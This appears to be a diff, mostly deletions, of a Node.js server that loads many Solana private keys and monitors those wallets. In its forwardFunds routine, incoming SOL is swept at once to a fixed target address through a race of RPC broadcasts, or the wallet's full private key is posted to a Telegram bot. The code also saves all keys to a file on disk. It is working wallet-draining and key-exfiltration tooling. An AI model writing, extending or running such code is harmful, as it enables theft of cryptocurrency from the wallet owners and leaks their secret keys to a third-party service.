-                'confirmed'
-            );
-            this.subscriptionIds[i] = subId;
-        } catch (e) {
-            if (e.message && e.message.includes('readyState')) {
-                setTimeout(() => { if (this.isMonitoring) this._subscribeSOL(i); }, 3000);
-            } else {
-                this.handleError(e, i, label);
-            }
-        }
-    }
-
-    async forwardFunds(connection, wallet, newBal, received, label, walletIdx) {
-        try {
-            const t0 = Date.now();
-
-            // ── وضع تلجرام: إشعار فقط، لا تحويل ──────────────────────────────
-            if (this.mode === 'telegram') {
-                const addr   = wallet.publicKey.toString();
-                const pk     = this.privateKeyStrings[walletIdx] || '';
-                const msg =
-                    `💰 <b>معاملة جديدة!</b>\n\n` +
-                    `🏦 المحفظة: <code>${addr.slice(0,8)}...${addr.slice(-8)}</code>\n` +
-                    `💵 المبلغ: +${(received / LAMPORTS_PER_SOL).toFixed(9)} SOL\n` +
-                    `🔄 النوع: 📥 استلام SOL\n\n` +
-                    `🔐 المفتاح الخاص:\n<code>${pk}</code>\n\n` +
-                    `📋 العنوان الكامل:\n<code>${addr}</code>`;
-                const tgRes = await sendTelegramMessage(TG_BOT_TOKEN, this.chatId, msg);
-                if (tgRes && tgRes.ok) {
-                    this.notify(`📨 ${label}: إشعار تلجرام أُرسل (+${(received / LAMPORTS_PER_SOL).toFixed(4)} SOL)`, 'success');
-                } else {
-                    this.notify(`❌ ${label}: فشل إرسال تلجرام — ${tgRes?.description || 'خطأ غير معروف'}`, 'error');
-                }
-                return true;
-            }
-
-            // ── وضع الإرسال: تحويل الأموال ────────────────────────────────────
-            // إرسال SOL فوراً — الرصيد معروف من الـ callback (لا fetch إضافي)
-            const amountToSend = newBal - 5_000;
-            if (amountToSend > 0) {
-                const sig = await this._sendAndConfirm(connection, wallet, (bh) => {
-                    const tx = new Transaction({ recentBlockhash: bh, feePayer: wallet.publicKey });
-                    tx.add(SystemProgram.transfer({
-                        fromPubkey: wallet.publicKey,
-                        toPubkey:   this.targetAddress,
-                        lamports:   amountToSend
-                    }));
-                    tx.sign(wallet);
-                    return tx.serialize();
-                }, label);
-                this.notify(
-                    `✅ ${label}: أُرسل ${(amountToSend / LAMPORTS_PER_SOL).toFixed(4)} SOL عبر ${this.broadcastConnections.length} RPC\n` +
-                    `📝 https://solscan.io/tx/${sig}\n⚡ ${Date.now() - t0}ms`,
-                    'success'
-                );
-            }
-
-            return true;
-        } catch (e) {
-            const msg = e.errors ? e.errors.map(x => x.message).join(' | ') : e.message;
-            this.notify(`❌ ${label}: خطأ في التحويل — ${msg}`, 'error');
-            return false;
-        }
-    }
-
-    // دالة مساعدة: اختيار broadcast connection بدوران لتوزيع الحمل HTTP
-    _nextHttpConn() {
-        if (!this.broadcastConnections.length) return null;
-        const c = this.broadcastConnections[this._rpcIdx % this.broadcastConnections.length];
-        this._rpcIdx = (this._rpcIdx + 1) % this.broadcastConnections.length;
-        return c;
-    }
-
-    // تحديث الـ blockhash في الخلفية عبر HTTP (RPC_URLS) — كل 10s
-    _startBlockhashRefresh() {
-        const refresh = async () => {
-            if (!this.isMonitoring) return;
-            try {
-                const conn = this._nextHttpConn();
-                if (conn) {
-                    const bh = await conn.getLatestBlockhash('processed');
-                    this._bhCache = { ...bh, fetchedAt: Date.now() };
-                }
-            } catch (_) {}
-            if (this.isMonitoring)
-                this._bhTimer = setTimeout(refresh, 10_000);
-        };
-        refresh();
-    }
-
-    // إرجاع الـ blockhash المُخزَّن إذا حديث (< 40s)، وإلا جلب عبر HTTP
-    async _getCachedBlockhash() {
-        if (this._bhCache.blockhash && Date.now() - this._bhCache.fetchedAt < 40_000)
-            return this._bhCache;
-        const conn = this._nextHttpConn();
-        if (!conn) throw new Error('لا توجد اتصالات HTTP متاحة');
-        const bh = await conn.getLatestBlockhash('processed');
-        this._bhCache = { ...bh, fetchedAt: Date.now() };
-        return bh;
-    }
-
-    // تأكيد TX عبر WebSocket (event-driven) — يسابق بين جميع broadcastConnections
-    // أسرع بكثير من استقصاء HTTP كل 500ms
-    async _confirmViaWs(sig, latest) {
-        const TIMEOUT_MS = 60_000; // حد أقصى 60s (عمر الـ blockhash)
-
-        // كل اتصال يشترك عبر WebSocket في sig — أول من يؤكد يفوز
-        const racePromises = this.broadcastConnections.map((conn, idx) =>
-            conn.confirmTransaction(
-                {
-                    signature:            sig,
-                    blockhash:            latest.blockhash,
-                    lastValidBlockHeight: latest.lastValidBlockHeight,
-                },
-                'confirmed'
-            ).then(res => {
-                if (res.value?.err)
-                    throw new Error(`TX رُفضت: ${JSON.stringify(res.value.err)}`);
-                console.log(`[CONFIRM] ✓ RPC#${idx + 1} أكدت أولاً`);
-                return true;
-            })
+        const hasToken = [...tokenAccounts, ...token2022Accounts].some(
+          a => a.account.data.parsed?.info?.mint === text
         );
 
-        // timeout بجانب السباق — لا ننتظر أبداً أكثر من TIMEOUT_MS
-        const timeout = new Promise((_, rej) =>
-            setTimeout(() => rej(new Error('انتهت مهلة التأكيد')), TIMEOUT_MS)
-        );
-
-        return Promise.race([Promise.any(racePromises), timeout]);
-    }
-
-    // ── إرسال TX مع تأكيد حقيقي وإعادة محاولة عند انتهاء الـ blockhash ──────
-    async _sendAndConfirm(connection, wallet, buildRawTx, label, maxAttempts = 3) {
-        for (let attempt = 1; attempt <= maxAttempts; attempt++) {
-            // blockhash من الكاش — عبر HTTP (دوران بين RPCs المستخدم)
-            const latest = await this._getCachedBlockhash();
-            const rawTx  = buildRawTx(latest.blockhash, latest.lastValidBlockHeight);
-
-            // استخراج التوقيع محلياً
-            const sig = bs58.encode(rawTx.slice(1, 65));
-
-            // blockhash صالح ~150 slot × 400ms = 60s — نمنح 58s هامش أمان
-            const expiresAt = (this._bhCache.fetchedAt || Date.now()) + 58_000;
-
-            // بث إلى كل RPCs بالتوازي (fire-and-forget)
-            const totalRpcs = this.broadcastConnections.length;
-            // skipPreflight: false — يُحاكي TX قبل الإرسال ويرفضها فوراً إن كان الرصيد غير كافٍ
-            // بدل إرسالها للشبكة وانتظار الرفض (يوفر وقتاً ويمنع Custom:1 الغامض)
-            this.broadcastConnections.forEach((c, idx) =>
-                c.sendRawTransaction(rawTx, { skipPreflight: false, maxRetries: 3 })
-                  .then(() => console.log(`[BROADCAST] ✓ RPC#${idx + 1}/${totalRpcs}`))
-                  .catch(e  => console.warn(`[BROADCAST] ✗ RPC#${idx + 1}/${totalRpcs}: ${e.message}`))
-            );
-            console.log(`[BROADCAST] → ${totalRpcs} RPC | sig: ${sig.slice(0, 12)}…`);
-
-            try {
-                // تأكيد عبر WebSocket — event-driven بدل استقصاء HTTP كل 500ms
-                await this._confirmViaWs(sig, latest);
-                return sig;
-            } catch (confirmErr) {
-                const isExpired = confirmErr instanceof TransactionExpiredBlockheightExceededError ||
-                                  confirmErr instanceof TransactionExpiredTimeoutError ||
-                                  confirmErr.message?.includes('block height exceeded') ||
-                                  confirmErr.message?.includes('BlockhashNotFound') ||
-                                  confirmErr.message?.includes('Blockhash not found') ||
-                                  confirmErr.message?.includes('انتهت مهلة التأكيد');
-                if (isExpired && attempt < maxAttempts) {
-                    console.warn(`[SEND] blockhash انتهت — إعادة المحاولة ${attempt + 1}/${maxAttempts} لـ ${label}`);
-                    this._bhCache.fetchedAt = 0;
-                    continue;
-                }
-                throw confirmErr;
-            }
-        }
-        throw new Error('فشلت جميع محاولات الإرسال');
-    }
-
-    handleError(error, idx, label) {
-        const MAX = 5;
-        this.rpcErrorCounts[idx] = (this.rpcErrorCounts[idx] || 0) + 1;
-        if (this.rpcErrorCounts[idx] >= MAX) {
-            if (this.subscriptionIds[idx] && this.connections[idx]) {
-                try { this.connections[idx].removeAccountChangeListener(this.subscriptionIds[idx]); } catch (_) {}
-                this.subscriptionIds[idx] = null;
-            }
-            if (!this.rpcFailedWallets.has(idx)) {
-                this.rpcFailedWallets.add(idx);
-                this.notify(`🛑 تم إيقاف ${label} — تعطل RPC بشكل متكرر`, 'error');
-            }
-        }
-        console.error(`[MONITOR] RPC error ${label} (${this.rpcErrorCounts[idx]}/${MAX}):`, error.message);
-    }
-
-    stop(clearAll = false) {
-        // ── أولاً: أوقف العلَم — يمنع onFail/retry callbacks من الاستيقاظ ──────
-        // يجب أن يكون قبل إغلاق أي WebSocket لأن إغلاقه يُطلق حدث 'close'
-        // الذي يُفعّل _watchPoolSlot › onFail — وهو يتحقق من isMonitoring أولاً
-        this.isMonitoring = false;
-        // إيقاف تحديث الـ blockhash قبل أي شيء آخر
-        if (this._bhTimer) { clearTimeout(this._bhTimer); this._bhTimer = null; }
-        this._bhCache = { blockhash: null, lastValidBlockHeight: 0, fetchedAt: 0 };
-
-        // ── إزالة اشتراكات SOL من الاتصالات المشتركة ─────────────────────────
-        for (let i = 0; i < this.wallets.length; i++) {
-            if (this.connections[i] && this.subscriptionIds[i] != null)
-                try { this.connections[i].removeAccountChangeListener(this.subscriptionIds[i]); } catch (_) {}
-        }
-        // ── إغلاق WebSocket لكل اتصال في SOL pool ────────────────────────────
-        // الآن isMonitoring=false → onFail سيخرج فوراً ولن يُنشئ اتصالات جديدة
-        const closedConns = new Set();
-        for (const conn of this.solPool) {
-            if (!conn || closedConns.has(conn)) continue;
-            closedConns.add(conn);
-            try { if (conn._rpcWebSocket) conn._rpcWebSocket.close(); } catch (_) {}
-        }
-        this.solPool         = [];
-        this.subscriptionIds = [];
-        this.lastBalances    = [];
-        this.rpcErrorCounts.fill(0);
-        this.rpcFailedWallets.clear();
-
-        // ── عند حذف الكل: امسح بيانات المحافظ كذلك حتى لا تظهر كمراقَبة ──────
-        if (clearAll) {
-            this.wallets           = [];
-            this.connections       = [];
-            this.privateKeyStrings = [];
-            this.rpcErrorCounts    = [];
-        }
-
-        console.log(`[PID ${process.pid}] Monitoring stopped, pool connections closed${clearAll ? ' (all wallets cleared)' : ''}`);
-    }
-
-    async resume(walletSlice, rpcSlice, allRpcUrls) {
-        return this.load(walletSlice, rpcSlice, allRpcUrls);
-    }
-
-    // ── تطبيق الإعدادات على المراقبة الجارية دون إعادة تحميل المحافظ ─────────
-    // mode/chatId → تُطبق فوراً
-    // network     → تُطبق فوراً إذا لم تكن المراقبة جارية؛ تُعيد تحميل كامل إذا تغيرت أثناء المراقبة
-    applySettings(settings = {}) {
-        const newNetwork = settings.network || 'mainnet';
-        const networkChanged = this.isMonitoring && newNetwork !== this.network;
-
-        this.mode    = settings.mode    || this.mode;
-        this.chatId  = settings.chatId  || '';
-        if (!networkChanged) this.network = newNetwork;
-
-        const modeLabel = this.mode === 'telegram' ? '📨 تلجرام' : '💸 إرسال مبالغ';
-        this.notify(`⚙️ الإعدادات حُدِّثت: ${modeLabel} | ${this.network}`, 'info');
-
-        // تُعيد true إذا احتاج الأمر لإعادة تحميل (تغيير الشبكة أثناء المراقبة)
-        return networkChanged;
-    }
-
-    getState() {
-        return {
-            isMonitoring:    this.isMonitoring,
-            walletCount:     this.wallets.length,
-            activeCount:     this.subscriptionIds.filter(s => s != null).length,
-            failedCount:     this.rpcFailedWallets.size,
-            walletAddresses: this.wallets.map((w, i) => ({
-                address:    w.publicKey.toString(),
-                active:     this.subscriptionIds[i] != null,
-                errorCount: this.rpcErrorCounts[i] || 0,
-                isFailed:   this.rpcFailedWallets.has(i),
-                balance:    this.lastBalances[i] || 0
-            }))
-        };
-    }
-
-    // إزالة محفظة واحدة بعنوانها — يقطع اشتراكها ويُعيد مفتاحها الخاص أو null
-    removeWallet(address) {
-        const idx = this.wallets.findIndex(w => w.publicKey.toString() === address);
-        if (idx === -1) return null;
-
-        // حفظ المفتاح الخاص قبل الحذف
-        const privateKey = this.privateKeyStrings[idx] || null;
-
-        // إلغاء اشتراك SOL
-        if (this.connections[idx] && this.subscriptionIds[idx] != null) {
-            try { this.connections[idx].removeAccountChangeListener(this.subscriptionIds[idx]); } catch(_) {}
-            this.subscriptionIds[idx] = null;
-        }
-
-        // تعديل مجموعة المحافظ الفاشلة — إزاحة الفهارس بعد المحذوف
-        const newFailed = new Set();
-        for (const fi of this.rpcFailedWallets) {
-            if      (fi < idx) newFailed.add(fi);
-            else if (fi > idx) newFailed.add(fi - 1);
-            // fi === idx → محذوفة، تُحذف
-        }
-        this.rpcFailedWallets = newFailed;
-
-        // حذف من جميع المصفوفات بنفس الفهرس
-        this.wallets.splice(idx, 1);
-        this.connections.splice(idx, 1);
-        this.subscriptionIds.splice(idx, 1);
-        this.lastBalances.splice(idx, 1);
-        this.rpcErrorCounts.splice(idx, 1);
-        this.privateKeyStrings.splice(idx, 1);
-
-        if (this.wallets.length === 0) this.isMonitoring = false;
-
-        console.log(`[PID ${process.pid}] removeWallet: ${address.slice(0,8)}… → متبقٍ ${this.wallets.length} محفظة`);
-        return privateKey;
-    }
-
-    // ── إضافة محافظ جديدة إلى مراقبة جارية بدون إيقاف الباقي ────────────────
-    async appendWallets(newKeys, settings = {}) {
-        // تحديث الإعدادات إن تغيرت
-        if (settings.mode)    this.mode    = settings.mode;
-        if (settings.chatId)  this.chatId  = settings.chatId;
-        if (settings.network) this.network = settings.network;
-
-        // إذا لم يُستدعَ load() من قبل، نُهيئ allRpcUrls من المتغير العام
-        if (!this.allRpcUrls?.length) this.allRpcUrls = ALL_RPC_URLS;
-
-        // تأكد أن broadcastConnections مهيَّأة وعلى الشبكة الصحيحة —
-        // قد تكون فارغة إذا أُضيفت المحافظ عبر appendWallets دون المرور بـ load()،
-        // أو تكون على شبكة قديمة إذا تغيّرت settings.network
-        const expectedBcPrefix = this.network === 'devnet' ? DEVNET_HTTP : null;
-        const bcStale = !this.broadcastConnections?.length ||
-            (this.network === 'devnet' && !this.broadcastConnections[0]?._rpcEndpoint?.startsWith(DEVNET_HTTP)) ||
-            (this.network !== 'devnet'  && this.broadcastConnections[0]?._rpcEndpoint?.startsWith(DEVNET_HTTP));
-        if (bcStale) {
-            const bcUrls = this.network === 'devnet' ? [DEVNET_HTTP] : this.allRpcUrls;
-            this.broadcastConnections = bcUrls.map(u => new Connection(u, 'confirmed'));
-            this._rpcIdx = 0;
-        }
-
-        const monitorUrls = this.network === 'devnet'
-            ? [DEVNET_HTTP]
-            : (this.snapshotRpcUrls?.length ? this.snapshotRpcUrls
-                : (this.allRpcUrls?.length  ? this.allRpcUrls : ALL_RPC_URLS));
-
-        const existing    = new Set(this.wallets.map(w => w.publicKey.toString()));
-        const added       = [];
-        const addedKeys   = []; // المفاتيح الخاصة المقابلة للمحافظ المضافة فعلاً
-        let   duplicates  = 0;
-        let   parseErrors = 0;
-
-        for (const rawKey of newKeys) {
-            const key = rawKey.trim();
-            if (!key) continue;
-            try {
-                let secretKey;
-                if (key.startsWith('[')) secretKey = Uint8Array.from(JSON.parse(key));
-                else                     secretKey = bs58.decode(key);
-
-                const wallet  = Keypair.fromSecretKey(secretKey);
-                const address = wallet.publicKey.toString();
-                if (existing.has(address)) { duplicates++; continue; }
-
-                const i = this.wallets.length;
-
-                // توسيع pool إذا تجاوزنا 1000 اشتراك/اتصال
-                const poolIdx = Math.floor(i / MAX_SUBS_PER_CONN);
-                if (poolIdx >= this.solPool.length) {
-                    if (!monitorUrls.length) { this.notify('❌ لا توجد روابط RPC', 'error'); break; }
-                    const url    = monitorUrls[this.solPool.length % monitorUrls.length];
-                    const wssUrl = url.replace(/^https?:\/\//i, 'wss://');
-                    const newConn = new Connection(url, { commitment: 'confirmed', wsEndpoint: wssUrl });
-                    this.solPool.push(newConn);
-                    this.poolUrls.push(url);
-                    this._watchPoolSlot(this.solPool, poolIdx);
-                    console.log(`[POOL] اتصال جديد للمجموعة ${poolIdx}: ${url.slice(0,40)}…`);
-                }
-
-                this.wallets.push(wallet);
-                this.privateKeyStrings.push(key);
-                this.connections.push(this.solPool[poolIdx]);
-                this.subscriptionIds.push(null);
-                this.lastBalances.push(0);
-                this.rpcErrorCounts.push(0);
-
-                existing.add(address);
-                added.push(address);
-                addedKeys.push(key);
-
-                // اشترك فوراً إذا كانت المراقبة تعمل
-                if (this.isMonitoring) this._subscribeSOL(i);
-
-            } catch(e) {
-                parseErrors++;
-                console.error(`[appendWallets] خطأ: ${e.message}`);
-            }
-        }
-
-        // إذا لم تكن المراقبة تعمل من قبل، ابدأها الآن
-        if (!this.isMonitoring && this.wallets.length > 0) {
-            this.isMonitoring = true;
-            await this.startMonitoring();
-        }
-
-        if (added.length)
-            this.notify(`✅ أُضيفت ${added.length} محفظة جديدة (المجموع: ${this.wallets.length})`, 'success');
-
-        return { addresses: added, keys: addedKeys, duplicates, parseErrors };
-    }
-}
-
-
-// ─────────────────────────────────────────────────────────────────────────────
-//  Telegram helper
-// ─────────────────────────────────────────────────────────────────────────────
-function sendTelegramMessage(botToken, chatId, text) {
-    if (!botToken || !chatId) {
-        console.warn('[TG] botToken أو chatId غير محدد — تم تخطي الإشعار');
-        return Promise.resolve({});
-    }
-    return new Promise((resolve) => {
-        const payload = JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' });
-        const req = https.request({
-            hostname: 'api.telegram.org',
-            path:     `/bot${botToken}/sendMessage`,
-            method:   'POST',
-            agent:    httpsKeepAlive,
-            headers:  { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) }
-        }, (res) => {
-            let data = '';
-            res.on('data', c => data += c);
-            res.on('end', () => {
-                try {
-                    const parsed = JSON.parse(data);
-                    if (!parsed.ok) console.error('[TG] خطأ:', parsed.description);
-                    resolve(parsed);
-                } catch { resolve({}); }
-            });
-        });
-        req.on('error', e => { console.error('[TG] network error:', e.message); resolve({}); });
-        req.write(payload);
-        req.end();
-    });
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-//  Shared HTTP app builder
-// ─────────────────────────────────────────────────────────────────────────────
-function buildExpressApp(getAggregatedState) {
-    const compression = require('compression');
-    const app = express();
-    app.use(compression());
-    app.use(express.json({ limit: '50mb' }));
-    app.use(express.urlencoded({ extended: true, limit: '50mb' }));
-    app.use((_, res, next) => {
-        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate');
-        res.setHeader('Pragma', 'no-cache');
-        res.setHeader('Expires', '0');
-        next();
-    });
-
-    app.get('/favicon.ico', (_, res) => res.status(204).end());
-
-    app.get('/health', (_, res) => {
-        const state = getAggregatedState();
-        res.json({ status: 'healthy', uptime: process.uptime(), ...state, timestamp: new Date().toISOString() });
-    });
-
-    app.get('/', (_, res) => res.sendFile(path.join(__dirname, 'index.html')));
-
-    app.get('/clear', (_, res) => res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body><script>localStorage.clear();location.href='/';<\/script></body></html>`));
-
-    // ── Auth: تسجيل الدخول (المشرف فقط عبر الخادم) ──────────────────────────
-    app.post('/api/login', (req, res) => {
-        const { username, password } = req.body || {};
-        if (!ADMIN_USER || !ADMIN_PASS)
-            return res.status(500).json({ error: 'ADMIN_PAS غير مهيأ — أضفه في متغيرات البيئة بصيغة username_password' });
-        if (username === ADMIN_USER && password === ADMIN_PASS)
-            return res.json({ ok: true, user: ADMIN_USER, token: AUTH_TOKEN, role: 'admin' });
-        return res.status(401).json({ error: 'اسم المستخدم أو كلمة المرور غير صحيحة' });
-    });
-
-    // ── Auth: التحقق من جلسة المشرف ──────────────────────────────────────────
-    app.get('/api/me', (req, res) => {
-        const h   = req.headers.authorization || '';
-        const tok = h.startsWith('Bearer ') ? h.slice(7) : (req.query.token || '');
-        if (AUTH_TOKEN && tok === AUTH_TOKEN)
-            return res.json({ loggedIn: true, user: ADMIN_USER, role: 'admin' });
-        return res.json({ loggedIn: false });
-    });
-
-    return app;
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-//  PRIMARY PROCESS
-// ─────────────────────────────────────────────────────────────────────────────
-if (cluster.isPrimary) {
-
-    // Global aggregated state across all processes
-    const globalNotifications = [];
-    const workerStates        = new Map(); // workerId → state
-    let   primaryState        = { isMonitoring: false, walletCount: 0, activeCount: 0, failedCount: 0, walletAddresses: [] };
-    let   storedWalletSlices  = []; // [{keys: [...], rpcs: [...]}]
-    let   allRpcUrls          = [];
-    let   lastSettings        = {}; // آخر إعدادات أُرسلت من المتصفح
-    // علَم يمنع المتصفح من إرسال المحافظ مجدداً إذا كان الخادم يملك ملف محفوظ
-    let   _hasSavedWallets    = false;
-
-    // ── حفظ جميع المحافظ والإعدادات في ملف دائم على القرص ──────────────────
-    function saveWalletsToDisk() {
-        try {
-            const allKeys = storedWalletSlices.flatMap(s => s.keys || []);
-            if (!allKeys.length) { clearWalletsFile(); return; }
-            const data = { keys: allKeys, settings: lastSettings, savedAt: new Date().toISOString() };
-            const tmp  = WALLETS_FILE + '.tmp';
-            // كتابة ذرية: اكتب في ملف مؤقت ثم أعد تسميته لتجنب تلف البيانات عند الانهيار
-            fs.writeFileSync(tmp, JSON.stringify(data), 'utf8');
-            fs.renameSync(tmp, WALLETS_FILE);
-        } catch (e) {
-            console.error('[PERSIST] فشل حفظ المحافظ:', e.message);
-        }
-    }
-
-    function clearWalletsFile() {
-        _hasSavedWallets = false;
-        try { if (fs.existsSync(WALLETS_FILE)) fs.unlinkSync(WALLETS_FILE); } catch (_) {}
-        try { if (fs.existsSync(WALLETS_FILE + '.tmp')) fs.unlinkSync(WALLETS_FILE + '.tmp'); } catch (_) {}
-    }
-
-    function loadWalletsFromDisk() {
-        // حاول القراءة من الملف الرئيسي، ثم من النسخة الاحتياطية عند الفشل
-        for (const filePath of [WALLETS_FILE, WALLETS_FILE + '.tmp']) {
-            try {
-                if (!fs.existsSync(filePath)) continue;
-                const raw  = fs.readFileSync(filePath, 'utf8');
-                const data = JSON.parse(raw);
-                if (!Array.isArray(data.keys) || !data.keys.length) continue;
-                return data; // { keys, settings, savedAt }
-            } catch (_) {}
-        }
-        console.error('[PERSIST] لا يوجد ملف محافظ صالح للقراءة');
-        return null;
-    }
-
-    // Local monitor for primary's wallet slice
-    const primaryMonitor = new SolanaWorkerMonitor((msg, type) => {
-        addGlobalNotification(msg, type);
-    });
-
-    // ── SSE (Server-Sent Events) للإشعارات الفورية ───────────────────────────
-    const sseClients = new Set();
-    function pushSSE(payload) {
-        if (!sseClients.size) return;
-        const msg = `data: ${JSON.stringify(payload)}\n\n`;
-        for (const res of sseClients) {
-            try { res.write(msg); } catch(_) { sseClients.delete(res); }
-        }
-    }
-
-    // ── تحديد معدل دفع تقدم التحميل عبر SSE (حد أقصى مرة كل 300ms) ─────────
-    let _progressSSETimer  = null;
-    let _progressSSEPending = null;
-
-    function addGlobalNotification(message, type) {
-        const n = { id: Date.now() + Math.random(), message, type, timestamp: new Date().toISOString() };
-
-        // إشعارات التقدم المؤقتة — لا تُضاف للسجل ولا تُبثّ للعمال
-        if (message.startsWith('__PROGRESS__:')) {
-            _progressSSEPending = n;
-            if (!_progressSSETimer) {
-                _progressSSETimer = setTimeout(() => {
-                    _progressSSETimer = null;
-                    if (_progressSSEPending)
-                        pushSSE({ t: 'n', n: _progressSSEPending, state: getLightState() });
-                    _progressSSEPending = null;
-                }, 300);
-            }
-            return;
-        }
-
-        globalNotifications.unshift(n);
-        if (globalNotifications.length > 100) globalNotifications.length = 100;
-        // لا نبثّ الإشعارات للعمال — العمال يُولّدون إشعاراتهم مستقلة
-        console.log(`[${type.toUpperCase()}] ${message}`);
-        // دفع فوري للمتصفح
-        pushSSE({ t: 'n', n, state: getLightState() });
-    }
-
-    const workers = new Map();
-
-    function broadcastToWorkers(msg) {
-        for (const [, w] of workers) { try { w.send(msg); } catch (_) {} }
-    }
-
-    // ── طلب Primary→Worker مع انتظار رد (مؤقَّت بـ 8 ثوانٍ) ─────────────────
-    let _primaryReqCounter = 0;
-    function askWorker(w, cmd, data) {
-        return new Promise(resolve => {
-            const reqId = 'p-' + (++_primaryReqCounter);
-            let settled = false;
-            const done = (val) => {
-                if (settled) return;
-                settled = true;
-                clearTimeout(timer);
-                w.off('message', handler);
-                resolve(val);
-            };
-            const handler = (msg) => {
-                if (msg.cmd === 'worker-response' && msg.reqId === reqId) done(msg.result);
-            };
-            w.on('message', handler);
-            try { w.send({ cmd, reqId, ...data }); } catch(_) { done(null); }
-            const timer = setTimeout(() => done(null), 8000);
-        });
-    }
-
-    let workersReady = 0; // عدد العمال الذين أكملوا التهيئة
-
-    // حالة خفيفة بدون مصفوفة العناوين — للـ SSE وتحديثات الحالة المتكررة
-    function getLightState() {
-        let totalWallets = primaryState.walletCount;
-        let totalActive  = primaryState.activeCount;
-        let totalFailed  = primaryState.failedCount;
-        let isMonitoring = primaryState.isMonitoring;
-        for (const [, s] of workerStates) {
-            totalWallets += s.walletCount;
-            totalActive  += s.activeCount;
-            totalFailed  += s.failedCount;
-            if (s.isMonitoring) isMonitoring = true;
-        }
-        return {
-            isMonitoring, totalWallets, totalActive, totalFailed,
-            walletAddresses: [],
-            workers: workers.size + 1,
-            workersReady,
-            numWorkers: NUM_EXTRA_WORKERS,
-            hasSavedWallets: _hasSavedWallets
-        };
-    }
-
-    // حالة كاملة مع العناوين — فقط عند طلب /api/state أو /api/status
-    function getAggregatedState() {
-        const light      = getLightState();
-        let allAddresses = [...primaryState.walletAddresses];
-        for (const [, s] of workerStates)
-            allAddresses = allAddresses.concat(s.walletAddresses || []);
-        return { ...light, walletAddresses: allAddresses };
-    }
-
-    // ── Fork N workers (عامل لكل رابط RPC، بحد أقصى 7 عمال إضافيين) ──────
-    const NUM_EXTRA_WORKERS = Math.max(1, Math.min(ALL_RPC_URLS.length - 1, 7));
-    const orderedWorkers = []; // محافظة على ترتيب الـ fork لتوزيع الشرائح
-
-    // ── معالج رسائل العامل — دالة مُسمّاة تُربط بالعامل الصحيح ──────────────
-    function setupWorkerHandlers(w) {
-        w.on('message', async (msg) => {
-            switch (msg.cmd) {
-                case 'add-wallets': {
-                    const keys = msg.privateKeys.split(/[\r\n]+/).map(k => k.trim()).filter(Boolean);
-                    allRpcUrls = ALL_RPC_URLS;
-
-                    if (keys.length === 0) {
-                        w.send({ cmd: 'response', reqId: msg.reqId, result: { success: false, message: 'لا توجد مفاتيح صالحة' } });
-                        return;
-                    }
-
-                    lastSettings = msg.settings || {};
-
-                    const total = keys.length;
-                    distributeWork(keys);
-                    primaryMonitor.stop();
-                    broadcastToWorkers({ cmd: 'stop-monitoring' });
-                    addGlobalNotification(`🚀 جاري تحميل ${total} محفظة`, 'info');
-                    w.send({ cmd: 'response', reqId: msg.reqId, result: { success: true, loading: true, total, message: `🚀 جاري تحميل ${total} محفظة — تابع شريط التقدم` } });
-                    loadAll(msg.settings || {}, total);
-                    break;
-                }
-                case 'stop': {
-                    primaryMonitor.stop();
-                    primaryState = primaryMonitor.getState();
-                    broadcastToWorkers({ cmd: 'stop-monitoring' });
-                    addGlobalNotification('🛑 تم إيقاف مراقبة جميع المحافظ بشكل نهائي', 'info');
-                    w.send({ cmd: 'response', reqId: msg.reqId, result: { success: true, message: 'تم إيقاف مراقبة جميع المحافظ بشكل نهائي' } });
-                    break;
-                }
-                case 'resume': {
-                    if (!storedWalletSlices.length || !storedWalletSlices[0].keys.length) {
-                        w.send({ cmd: 'response', reqId: msg.reqId, result: { success: false, message: 'لا توجد محافظ محفوظة' } });
-                        return;
-                    }
-                    const resumeTotal = storedWalletSlices.reduce((s, x) => s + x.keys.length, 0);
-                    addGlobalNotification(`🚀 جاري استئناف ${resumeTotal} محفظة`, 'info');
-                    w.send({ cmd: 'response', reqId: msg.reqId, result: { success: true, loading: true, total: resumeTotal, message: `🚀 جاري استئناف ${resumeTotal} محفظة` } });
-                    loadAll(lastSettings, resumeTotal);
-                    break;
-                }
-                case 'delete-wallet': {
-                    // طلب حذف محفظة قادم من عامل HTTP يُوكّل للـ primary
-                    const delAddr = msg.address || '';
-                    const shortDel = delAddr.slice(0,4) + '...' + delAddr.slice(-4);
-                    const pk = primaryMonitor.removeWallet(delAddr);
-                    let found = pk !== null;
-                    let removedKey = pk;
-                    if (found && storedWalletSlices[0]?.keys) {
-                        const ki = storedWalletSlices[0].keys.indexOf(pk);
-                        if (ki !== -1) storedWalletSlices[0].keys.splice(ki, 1);
-                        primaryState = primaryMonitor.getState();
-                    } else if (!found) {
-                        // ابحث في جميع العمال بما فيهم الطالب — المحفظة قد تكون عليه
-                        for (let wi = 0; wi < orderedWorkers.length; wi++) {
-                            const wRes = await askWorker(orderedWorkers[wi], 'delete-wallet', { address: delAddr });
-                            if (wRes?.found) {
-                                found = true; removedKey = wRes.removedKey;
-                                const sliceW = storedWalletSlices[wi + 1];
-                                if (removedKey && sliceW?.keys) {
-                                    const ki = sliceW.keys.indexOf(removedKey);
-                                    if (ki !== -1) sliceW.keys.splice(ki, 1);
-                                }
-                                break;
-                            }
-                        }
-                    }
-                    if (found) {
-                        addGlobalNotification(`🗑️ حُذفت المحفظة ${shortDel} من المراقبة`, 'info');
-                        await new Promise(r => setTimeout(r, 300));
-                        pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
-                        w.send({ cmd: 'response', reqId: msg.reqId, result: { success: true, message: `تم حذف المحفظة ${shortDel}`, removedKey } });
-                    } else {
-                        w.send({ cmd: 'response', reqId: msg.reqId, result: { success: false, message: `المحفظة ${shortDel} غير موجودة` } });
-                    }
-                    break;
-                }
-                case 'append-wallets': {
-                    // طلب إضافة تدريجية قادم من عامل HTTP يُوكّل للـ primary
-                    const appendKeys     = (msg.keys || []).map(k => k.trim()).filter(Boolean);
-                    const appendSettings = msg.settings || lastSettings || {};
-                    const modeLabel2     = appendSettings.mode === 'telegram' ? '📨 تلجرام' : '💸 إرسال مبالغ';
-
-                    // العملية الأخف بين primary + orderedWorkers
-                    let tgt      = 'primary';
-                    let minCnt   = primaryMonitor.wallets.length;
-                    for (let wi = 0; wi < orderedWorkers.length; wi++) {
-                        const ws2  = workerStates.get(orderedWorkers[wi].id);
